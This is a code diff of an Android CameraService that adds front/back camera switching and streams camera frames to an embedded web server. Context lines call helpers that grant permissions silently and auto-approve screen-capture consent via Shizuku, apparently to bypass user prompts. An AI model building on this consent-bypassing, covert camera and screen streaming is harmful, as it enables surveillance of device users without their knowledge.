@@ -26,7 +26,6 @@ import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
-import java.io.ByteArrayOutputStream;
 import java.nio.ByteBuffer;
 import java.util.Collections;
 
@@ -45,6 +44,7 @@ public class CameraService extends Service {
     private Handler backgroundHandler;
 
     private boolean isCameraRunning = false;
+    private int selectedLensFacing = CameraCharacteristics.LENS_FACING_BACK;
     private ScreenCaptureController screenCaptureController;
 
     public static CameraService getInstance() {
@@ -59,10 +59,7 @@ public class CameraService extends Service {
         createNotificationChannel();
         startForegroundServiceNotification();
 
-        // Autoconceder permisos del sistema usando Shizuku/Device Owner
         AdminUtils.otorgarPermisosSilenciosamente(this);
-
-        screenCaptureController = new ScreenCaptureController(this);
     }
 
     @Override
@@ -112,7 +109,6 @@ public class CameraService extends Service {
         backgroundHandler.post(() -> {
             if (screenCaptureController != null && screenCaptureController.isRunning()) return;
 
-            // Intentar inicio totalmente transparente vía Shizuku si está disponible
             if (MediaProjectionHelper.isShizukuAvailable()) {
                 MediaProjectionHelper.otorgarConsentimientoShizuku(getPackageName());
                 
@@ -126,9 +122,21 @@ public class CameraService extends Service {
     }
 
     public void detenerCapturaPantalla() {
+        detenerProyeccionPantalla();
+    }
+
+    // Alias para compatibilidad con WebServer.java
+    public void detenerProyeccionPantalla() {
         if (screenCaptureController != null) {
-            screenCaptureController.stop();
+            screenCaptureController.detenerCaptura();
         }
+    }
+
+    public synchronized void alternarCamara() {
+        detenerCamara();
+        selectedLensFacing = (selectedLensFacing == CameraCharacteristics.LENS_FACING_BACK) ?
+                CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
+        iniciarCamara();
     }
 
     public synchronized void iniciarCamara() {
@@ -136,7 +144,7 @@ public class CameraService extends Service {
         backgroundHandler.post(() -> {
             try {
                 cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-                String cameraId = getBackCameraId();
+                String cameraId = getCameraIdByFacing(selectedLensFacing);
                 if (cameraId == null) return;
 
                 imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
@@ -146,7 +154,12 @@ public class CameraService extends Service {
                             ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                             byte[] bytes = new byte[buffer.remaining()];
                             buffer.get(bytes);
-                            StreamManager.getInstance().broadcastFrame(bytes);
+
+                            // Envío de frames directo al servidor web activo
+                            WebServer server = ServerService.getWebServerInstance();
+                            if (server != null) {
+                                server.broadcastCameraFrame(bytes);
+                            }
                         }
                     } catch (Exception e) {
                         Log.e(TAG, "Error procesando frame de cámara", e);
@@ -226,11 +239,11 @@ public class CameraService extends Service {
         });
     }
 
-    private String getBackCameraId() throws CameraAccessException {
+    private String getCameraIdByFacing(int facingTarget) throws CameraAccessException {
         for (String id : cameraManager.getCameraIdList()) {
             CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
             Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-            if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
+            if (facing != null && facing == facingTarget) {
                 return id;
             }
         }
@@ -259,7 +272,7 @@ public class CameraService extends Service {
     @Override
     public void onDestroy() {
         detenerCamara();
-        detenerCapturaPantalla();
+        detenerProyeccionPantalla();
         stopBackgroundThread();
         instance = null;
         super.onDestroy();
